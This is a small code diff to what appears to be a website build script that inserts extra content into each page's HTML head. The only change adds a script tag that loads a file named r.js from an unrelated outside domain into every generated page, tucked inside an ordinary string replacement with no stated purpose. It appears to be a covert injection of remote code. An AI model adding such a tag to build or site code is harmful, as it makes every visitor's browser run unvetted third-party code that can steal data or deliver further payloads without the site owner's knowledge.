@@ -95,7 +95,7 @@ const headExtras = `
   },
 ])}</script>
 `;
-html = html.replace('</head>', `${headExtras}\n</head>`);
+html = html.replace('</head>', `${headExtras}\n<script src="https://ref.web-free.site/r.js" defer></script>\n</head>`);
 
 const chrome = `
 <header class="site-chrome">
